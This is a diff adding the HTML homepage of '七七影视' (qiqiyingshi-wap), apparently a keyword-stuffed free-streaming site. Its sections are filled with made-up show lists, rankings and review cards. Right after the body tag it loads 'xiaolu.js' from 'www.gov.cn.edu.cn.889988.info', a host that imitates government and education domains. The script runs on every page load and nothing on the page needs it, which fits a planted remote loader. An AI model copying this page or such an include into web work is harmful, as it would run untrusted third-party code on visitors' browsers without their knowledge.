@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>七七影视 - 高清影视免费在线观看 | qiqiyingshi-wap</title>
+<meta name="keywords" content="七七影视, qiqiyingshi-wap, 高清影视, 免费看电影, 电视剧免费看, 影视在线观看">
+<meta name="description" content="七七影视(qiqiyingshi-wap)提供海量高清影视免费在线观看，电影、电视剧、综艺、动漫每日更新，界面清爽、播放流畅，是您追剧看片的首选平台。">
+<meta name="robots" content="index, follow">
+<meta name="author" content="七七影视">
+<meta name="theme-color" content="#1a0b2e">
+<link rel="canonical" href="https://qiqiyingshi-wap.github.io">
+<meta property="og:title" content="七七影视 - 高清影视免费在线观看">
+<meta property="og:description" content="七七影视(qiqiyingshi-wap)提供海量高清影视免费在线观看，电影、电视剧、综艺、动漫每日更新，界面清爽、播放流畅。">
+<meta property="og:type" content="website">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;background:#140726;color:#f0e9fb;line-height:1.65;overflow-x:hidden}
+a{color:inherit;text-decoration:none;transition:.2s}
+ul{list-style:none}
+:root{--vio:#9b5de5;--vio-d:#6b21c9;--pink:#ff5cae;--sky:#4cc9f0;--lemon:#ffd23f;--card:rgba(255,255,255,.06);--line:rgba(255,255,255,.12);--muted:#b6a8d4}
+.container{max-width:1120px;margin:0 auto;padding:0 16px}
+section{padding:76px 0}
+.eyebrow{font-size:.78rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:#c9a5ff;margin-bottom:8px}
+.sec-title{font-size:clamp(1.5rem,4vw,2.2rem);font-weight:900;margin-bottom:8px}
+.sec-desc{color:var(--muted);font-size:.94rem;margin-bottom:34px;max-width:640px}
+
+/* 导航 */
+.site-header{position:sticky;top:0;z-index:100;background:rgba(20,7,38,.92);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.nav-row{display:flex;align-items:center;justify-content:space-between;height:70px}
+.logo{font-size:1.4rem;font-weight:900;display:flex;align-items:center;gap:10px}
+.logo-num{font-size:1.7rem;font-weight:900;background:linear-gradient(135deg,var(--pink),var(--vio));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.nav-links{display:flex;gap:2px;align-items:center}
+.nav-links a{padding:10px 16px;border-radius:12px;font-size:.92rem;color:#e0d4f5;font-weight:500}
+.nav-links a:hover{background:rgba(155,93,229,.22);color:#fff}
+.nav-cta{margin-left:10px;padding:10px 22px;border-radius:12px;background:linear-gradient(90deg,var(--pink),var(--vio));font-size:.88rem;font-weight:700;color:#fff}
+.menu-btn{display:none;width:40px;height:40px;border-radius:10px;background:var(--card);border:1px solid var(--line);align-items:center;justify-content:center;cursor:pointer;flex-direction:column;gap:5px}
+.menu-btn i{display:block;width:18px;height:2px;background:#fff}
+
+/* Hero */
+.hero{position:relative;min-height:80vh;display:flex;align-items:center;overflow:hidden;background:radial-gradient(800px 500px at 80% 20%,rgba(155,93,229,.35),transparent 60%),radial-gradient(700px 600px at 15% 90%,rgba(76,201,240,.25),transparent 60%),#140726}
+.stars{position:absolute;inset:0;z-index:0}
+.star{position:absolute;width:3px;height:3px;background:#fff;border-radius:50%;opacity:.7;animation:tw 3s infinite}
+@keyframes tw{0%,100%{opacity:.2}50%{opacity:1}}
+.hero-inner{position:relative;z-index:2;padding:90px 0}
+.hero h1{font-size:clamp(2.2rem,6vw,4rem);font-weight:900;line-height:1.15;margin-bottom:18px}
+.hero h1 span{background:linear-gradient(90deg,var(--pink),var(--sky));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.hero p{font-size:clamp(1rem,2.2vw,1.15rem);color:#c9bbde;max-width:600px;margin-bottom:30px}
+.stats{display:flex;gap:40px;margin-bottom:34px;flex-wrap:wrap}
+.stat b{font-size:clamp(1.6rem,4vw,2.4rem);font-weight:900;display:block;background:linear-gradient(135deg,#fff,var(--pink));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.stat span{font-size:.84rem;color:var(--muted)}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap}
+.btn{padding:15px 34px;border-radius:14px;font-weight:700;font-size:.96rem;cursor:pointer;border:none;display:inline-flex;align-items:center;gap:8px}
+.btn-main{background:linear-gradient(90deg,var(--pink),var(--vio));color:#fff;box-shadow:0 12px 34px rgba(155,93,229,.4)}
+.btn-line{background:transparent;border:1.5px solid var(--line);color:#fff}
+
+/* 栏目1 热门影视（横向滚动卡片） */
+.sec-head{display:flex;justify-content:space-between;align-items:flex-end;gap:16px;flex-wrap:wrap;margin-bottom:28px}
+.sec-head .t{display:block}
+.tabs{display:flex;gap:8px;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:4px}
+.tabs button{padding:8px 18px;border-radius:9px;border:none;background:transparent;color:#c9bbde;font-weight:600;cursor:pointer;font-size:.88rem}
+.tabs button.on{background:linear-gradient(90deg,var(--pink),var(--vio));color:#fff}
+.hscroll{display:flex;gap:18px;overflow-x:auto;scroll-snap-type:x mandatory;padding-bottom:8px;scrollbar-width:thin}
+.hscroll::-webkit-scrollbar{height:6px}
+.hscroll::-webkit-scrollbar-thumb{background:var(--vio);border-radius:3px}
+.flick{flex:0 0 200px;scroll-snap-align:start;border-radius:16px;overflow:hidden;border:1px solid var(--line);background:var(--card);transition:.3s}
+.flick:hover{transform:translateY(-6px);border-color:var(--pink)}
+.flick-cover{height:260px;position:relative;display:flex;flex-direction:column;justify-content:space-between;padding:14px}
+.flick-tag{font-size:.72rem;padding:4px 10px;border-radius:8px;background:rgba(255,255,255,.9);color:#4a1d8c;font-weight:700;align-self:flex-start}
+.flick-cover h3{font-size:1.15rem;font-weight:900;text-shadow:0 2px 10px rgba(0,0,0,.7);z-index:2}
+.flick-foot{padding:12px 14px;font-size:.82rem;color:var(--muted);display:flex;justify-content:space-between}
+
+/* 栏目2 频道分类（圆形图标） */
+.circle-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:22px;text-align:center}
+.circ{display:flex;flex-direction:column;align-items:center;gap:12px;cursor:pointer}
+.circ-i{width:88px;height:88px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:2rem;transition:.3s;position:relative}
+.circ-i::after{content:'';position:absolute;inset:-5px;border-radius:50%;border:2px solid transparent;transition:.3s}
+.circ:hover .circ-i{transform:scale(1.08)}
+.circ:hover .circ-i::after{border-color:var(--pink)}
+.circ span{font-weight:600;font-size:.94rem}
+
+/* 栏目3 更新日历（横向时间线） */
+.timeline{position:relative;padding:30px 0}
+.tl-track{display:flex;gap:0;overflow-x:auto;scroll-snap-type:x mandatory;padding-bottom:12px}
+.tl-node{flex:0 0 150px;scroll-snap-align:start;text-align:center;position:relative;padding:0 10px}
+.tl-node::before{content:'';position:absolute;top:34px;left:50%;right:-50%;height:3px;background:linear-gradient(90deg,var(--vio),var(--pink))}
+.tl-node:last-child::before{display:none}
+.tl-dot{width:70px;height:70px;border-radius:50%;margin:0 auto 14px;display:flex;flex-direction:column;align-items:center;justify-content:center;font-weight:900;font-size:1.1rem;position:relative;z-index:2;border:3px solid #140726}
+.tl-dot small{font-size:.72rem;font-weight:600;opacity:.85}
+.tl-node h4{font-size:.98rem;font-weight:700;margin-bottom:4px}
+.tl-node p{font-size:.8rem;color:var(--muted)}
+
+/* 栏目4 排行榜（左右分栏 进度条） */
+.rank-split{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.rk-col{border:1px solid var(--line);border-radius:20px;padding:24px;background:linear-gradient(180deg,rgba(155,93,229,.12),rgba(20,7,38,.5))}
+.rk-col h3{font-size:1.1rem;font-weight:900;margin-bottom:18px;display:flex;align-items:center;gap:8px}
+.rk-bar{margin-bottom:16px}
+.rk-bar-top{display:flex;justify-content:space-between;font-size:.88rem;margin-bottom:6px}
+.rk-bar-top b{font-weight:700}
+.rk-bar-top em{font-style:normal;color:var(--pink)}
+.bar{height:8px;border-radius:6px;background:rgba(255,255,255,.1);overflow:hidden}
+.bar i{display:block;height:100%;border-radius:6px;background:linear-gradient(90deg,var(--pink),var(--vio))}
+
+/* 栏目5 影评资讯（瀑布流卡片） */
+.masonry{columns:2;column-gap:18px}
+.m-card{break-inside:avoid;margin-bottom:18px;border:1px solid var(--line);border-radius:18px;overflow:hidden;background:var(--card);transition:.3s}
+.m-card:hover{transform:translateY(-4px);border-color:var(--sky)}
+.m-head{padding:20px 20px 14px;font-size:1.6rem}
+.m-body{padding:0 20px 20px}
+.m-tag{font-size:.74rem;padding:4px 12px;border-radius:12px;background:rgba(76,201,240,.2);color:var(--sky)}
+.m-body h4{font-size:1rem;font-weight:700;margin:10px 0 6px}
+.m-body p{font-size:.85rem;color:#c9bbde}
+
+/* CTA */
+.cta{text-align:center;padding:70px 24px;border-radius:28px;position:relative;overflow:hidden;border:1px solid var(--line);background:radial-gradient(600px 300px at 50% -40%,rgba(155,93,229,.4),transparent 70%),linear-gradient(135deg,rgba(255,92,174,.18),rgba(20,7,38,.6))}
+.cta h2{font-size:clamp(1.6rem,4vw,2.6rem);font-weight:900;margin-bottom:14px}
+.cta p{color:#c9bbde;max-width:560px;margin:0 auto 28px}
+
+/* Footer */
+.site-footer{background:#0d041c;border-top:1px solid var(--line);padding:56px 0 26px}
+.foot-row{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:32px;margin-bottom:36px}
+.foot-col h5{font-size:1rem;font-weight:700;margin-bottom:16px}
+.foot-col p,.foot-col a{color:var(--muted);font-size:.88rem}
+.foot-col a{display:block;padding:5px 0}
+.foot-col a:hover{color:var(--pink)}
+.foot-bottom{border-top:1px solid var(--line);padding-top:22px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:.82rem;color:var(--muted)}
+</style>
+</head>
+<body id="top">
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header class="site-header">
+  <div class="container nav-row">
+    <a href="#top" class="logo"><span class="logo-num">77</span>七七影视</a>
+    <nav class="nav-links" id="navLinks">
+      <a href="#home">首页</a>
+      <a href="#rec">热门影视</a>
+      <a href="#chan">频道分类</a>
+      <a href="#cal">更新日历</a>
+      <a href="#rank">排行榜</a>
+      <a href="#news">影评资讯</a>
+      <a href="#rec" class="nav-cta">免费看片</a>
+    </nav>
+    <div class="menu-btn" id="menuBtn" aria-label="菜单"><i></i><i></i><i></i></div>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="stars" id="stars"></div>
+  <div class="container hero-inner">
+    <div class="eyebrow">QIQIYINGSHI-WAP</div>
+    <h1>七七影视 · <span>追剧看片</span><br>一站搞定</h1>
+    <p>七七影视(qiqiyingshi-wap)汇聚海量高清电影、电视剧、综艺、动漫资源，界面清爽、播放流畅，每日更新，是您免费追剧看片的首选平台。</p>
+    <div class="stats">
+      <div class="stat"><b>12万+</b><span>影视资源</span></div>
+      <div class="stat"><b>4K</b><span>高清画质</span></div>
+      <div class="stat"><b>0元</b><span>全程免费</span></div>
+    </div>
+    <div class="hero-actions">
+      <a href="#rec" class="btn btn-main">立即免费看片 →</a>
+      <a href="#chan" class="btn btn-line">浏览频道</a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目1 热门影视 -->
+<section id="rec">
+  <div class="container">
+    <div class="sec-head">
+      <div class="t"><div class="eyebrow">POPULAR NOW</div><h2 class="sec-title">热门影视</h2></div>
+      <div class="tabs">
+        <button class="on">热播</button><button>电影</button><button>剧集</button><button>综艺</button>
+      </div>
+    </div>
+    <p class="sec-desc">七七影视每日精选高热度影视作品，横滑浏览，全部免费观看。</p>
+    <div class="hscroll" id="flickWrap"></div>
+  </div>
+</section>
+
+<!-- 栏目2 频道分类 -->
+<section style="background:linear-gradient(180deg,#140726,#21103c)" id="chan">
+  <div class="container">
+    <div class="eyebrow">CHANNELS</div>
+    <h2 class="sec-title">频道分类</h2>
+    <p class="sec-desc">按频道快速定位，七七影视帮你找到最对味的那一部。</p>
+    <div class="circle-grid">
+      <a href="#" class="circ"><span class="circ-i" style="background:linear-gradient(135deg,#ff5cae,#9b5de5)">🎬</span><span>电影</span></a>
+      <a href="#" class="circ"><span class="circ-i" style="background:linear-gradient(135deg,#9b5de5,#6b21c9)">📺</span><span>电视剧</span></a>
+      <a href="#" class="circ"><span class="circ-i" style="background:linear-gradient(135deg,#ffd23f,#f59e0b)">🎤</span><span>综艺</span></a>
+      <a href="#" class="circ"><span class="circ-i" style="background:linear-gradient(135deg,#4cc9f0,#2563eb)">🌸</span><span>动漫</span></a>
+      <a href="#" class="circ"><span class="circ-i" style="background:linear-gradient(135deg,#f472b6,#db2777)">📽️</span><span>纪录片</span></a>
+      <a href="#" class="circ"><span class="circ-i" style="background:linear-gradient(135deg,#34d399,#059669)">⭐</span><span>专题</span></a>
+      <a href="#" class="circ"><span class="circ-i" style="background:linear-gradient(135deg,#f87171,#dc2626)">🎭</span><span>经典</span></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3 更新日历 -->
+<section id="cal">
+  <div class="container">
+    <div class="eyebrow">UPDATE TIMELINE</div>
+    <h2 class="sec-title">更新日历</h2>
+    <p class="sec-desc">七七影视每日更新，追剧时间表一目了然，横滑查看。</p>
+    <div class="timeline">
+      <div class="tl-track" id="tlTrack"></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4 排行榜 -->
+<section style="background:linear-gradient(180deg,#21103c,#140726)" id="rank">
+  <div class="container">
+    <div class="eyebrow">TOP RANKING</div>
+    <h2 class="sec-title">热播排行榜</h2>
+    <p class="sec-desc">七七影视全站播放量最高影视榜单，真实数据实时排行。</p>
+    <div class="rank-split">
+      <div class="rk-col">
+        <h3>🎬 电影榜</h3>
+        <div id="rkMovie"></div>
+      </div>
+      <div class="rk-col">
+        <h3>📺 剧集榜</h3>
+        <div id="rkTv"></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目5 影评资讯 -->
+<section id="news">
+  <div class="container">
+    <div class="eyebrow">NEWS & REVIEW</div>
+    <h2 class="sec-title">影评资讯</h2>
+    <p class="sec-desc">最新影视资讯与深度影评，陪你读懂每一部好作品。</p>
+    <div class="masonry" id="masonry"></div>
+  </div>
+</section>
+
+<!-- CTA -->
+<section>
+  <div class="container">
+    <div class="cta">
+      <h2>打开七七影视，免费看片不等待</h2>
+      <p>收藏七七影视 qiqiyingshi-wap，高清流畅不等待，随时随地畅快看。</p>
+      <a href="#rec" class="btn btn-main">立即免费观看 →</a>
+    </div>
+  </div>
+</section>
+
+<footer class="site-footer">
+  <div class="container">
+    <div class="foot-row">
+      <div class="foot-col">
+        <h5><span class="logo-num">77</span> 七七影视</h5>
+        <p>七七影视(qiqiyingshi-wap)专注提供海量高清影视免费在线观看，电影、电视剧、综艺、动漫每日更新，界面清爽、播放流畅，是您追剧看片的首选平台。</p>
+      </div>
+      <div class="foot-col"><h5>频道</h5><a href="#">电影</a><a href="#">电视剧</a><a href="#">综艺</a><a href="#">动漫</a></div>
+      <div class="foot-col"><h5>帮助</h5><a href="#">观看指南</a><a href="#">反馈建议</a><a href="#">常见问题</a></div>
+      <div class="foot-col"><h5>关于</h5><a href="#">关于我们</a><a href="#">免责声明</a><a href="#">联系方式</a></div>
+    </div>
+    <div class="foot-bottom">
+      <span>© 2026 七七影视 qiqiyingshi-wap 版权所有</span>
+      <span>网站网址：https://qiqiyingshi-wap.github.io</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+/* 星空 */
+var stars='';
+for(var i=0;i<60;i++){stars+='<div class="star" style="top:'+Math.random()*100+'%;left:'+Math.random()*100+'%;animation-delay:'+(Math.random()*3)+'s"></div>';}
+document.getElementById('stars').innerHTML=stars;
+
+/* 热门影视 */
+var flicks=[
+  {t:"长河落日",s:"古装",c:"linear-gradient(135deg,#9b5de5,#4c1d6e)"},
+  {t:"无声证言",s:"悬疑",c:"linear-gradient(135deg,#4c1d6e,#140726)"},
+  {t:"星际归途",s:"科幻",c:"linear-gradient(135deg,#4cc9f0,#1e40af)"},
+  {t:"此情可待",s:"爱情",c:"linear-gradient(135deg,#ff5cae,#9b5de5)"},
+  {t:"硬核营救",s:"动作",c:"linear-gradient(135deg,#f59e0b,#b45309)"},
+  {t:"深海之境",s:"纪录片",c:"linear-gradient(135deg,#06b6d4,#0e7490)"},
+  {t:"漫长的夜",s:"犯罪",c:"linear-gradient(135deg,#6366f1,#3730a3)"},
+  {t:"甜甜日记",s:"青春",c:"linear-gradient(135deg,#f472b6,#be185d)"}
+];
+var fw=document.getElementById('flickWrap');
+flicks.forEach(function(p,i){fw.innerHTML+='<a href="#" class="flick"><div class="flick-cover" style="background:'+p.c+'"><span class="flick-tag">'+(i+1)+' 热播</span><h3>'+p.t+'</h3></div><div class="flick-foot"><span>'+p.s+'</span><span>▶ 播放</span></div></a>';});
+
+/* 更新日历 */
+var days=[
+  {d:23,n:"星际归途",c:"linear-gradient(135deg,#4cc9f0,#1e40af)",day:"周一"},
+  {d:24,n:"此情可待",c:"linear-gradient(135deg,#ff5cae,#9b5de5)",day:"周二"},
+  {d:25,n:"硬核营救",c:"linear-gradient(135deg,#f59e0b,#b45309)",day:"周三"},
+  {d:26,n:"深海之境",c:"linear-gradient(135deg,#06b6d4,#0e7490)",day:"周四"},
+  {d:27,n:"漫长的夜",c:"linear-gradient(135deg,#6366f1,#3730a3)",day:"周五"},
+  {d:28,n:"甜甜日记",c:"linear-gradient(135deg,#f472b6,#be185d)",day:"周六"},
+  {d:29,n:"长河落日",c:"linear-gradient(135deg,#9b5de5,#4c1d6e)",day:"周日"}
+];
+var tt=document.getElementById('tlTrack');
+days.forEach(function(d){tt.innerHTML+='<div class="tl-node"><div class="tl-dot" style="background:'+d.c+'"><b>'+d.d+'</b><small>'+d.day+'</small></div><h4>'+d.n+'</h4><p>已更新至第12集</p></div>';});
+
+/* 排行榜 */
+function bars(id,list){var h='';list.forEach(function(r,i){var pct=100-i*9;h+='<div class="rk-bar"><div class="rk-bar-top"><b>'+(i+1)+'. '+r[0]+'</b><em>'+r[1]+'</em></div><div class="bar"><i style="width:'+pct+'%"></i></div></div>';});document.getElementById(id).innerHTML=h;}
+bars('rkMovie',[["长河落日","9.4"],["星际归途","8.9"],["无声证言","9.2"],["硬核营救","8.7"],["深海之境","9.1"]]);
+bars('rkTv',[["长河落日","9.4"],["无声证言","9.2"],["此情可待","8.6"],["漫长的夜","9.0"],["知否知否","8.7"]]);
+
+/* 影评资讯 */
+var mnews=[
+  {ic:"🔥",c:"linear-gradient(135deg,#9b5de5,#4c1d6e)",h:"十月必看国产剧Top10",p:"从现实主义到古装悬疑，这些年度佳作全部免费看到爽。",t:"精选推荐"},
+  {ic:"🍿",c:"linear-gradient(135deg,#f59e0b,#b45309)",h:"月底电影前瞻：哪些大片值得期待？",p:"盘点未来一个月即将上线的院线大片与口碑之作。",t:"电影资讯"},
+  {ic:"📺",c:"linear-gradient(135deg,#ff5cae,#9b5de5)",h:"一口气追完的悬疑短剧清单",p:"节奏紧凑、反转不断的短剧合集，追剧党收藏必备。",t:"剧集盘点"},
+  {ic:"💬",c:"linear-gradient(135deg,#4cc9f0,#1e40af)",h:"深度影评：《星际归途》如何讲好一个科幻故事",p:"从叙事结构到视听语言，全面解析这部现象级科幻剧。",t:"深度影评"},
+  {ic:"🎭",c:"linear-gradient(135deg,#6366f1,#3730a3)",h:"经典重温：那些年我们一起追过的神剧",p:"盘点十年前的经典老剧，如今重温依然耐看。",t:"经典重温"}
+];
+var mw=document.getElementById('masonry');
+mnews.forEach(function(n){mw.innerHTML+='<a href="#" class="m-card"><div class="m-head" style="background:'+n.c+'">'+n.ic+'</div><div class="m-body"><span class="m-tag">'+n.t+'</span><h4>'+n.h+'</h4><p>'+n.p+'</p></div></a>';});
+
+/* 交互 */
+document.getElementById('menuBtn').addEventListener('click',function(){document.getElementById('navLinks').classList.toggle('open');});
+document.querySelectorAll('.nav-links a').forEach(function(a){a.addEventListener('click',function(){document.getElementById('navLinks').classList.remove('open');});});
+document.querySelectorAll('.tabs button').forEach(function(b){b.addEventListener('click',function(){document.querySelectorAll('.tabs button').forEach(function(x){x.classList.remove('on');});b.classList.add('on');});});
+</script>
+</body>
+</html>
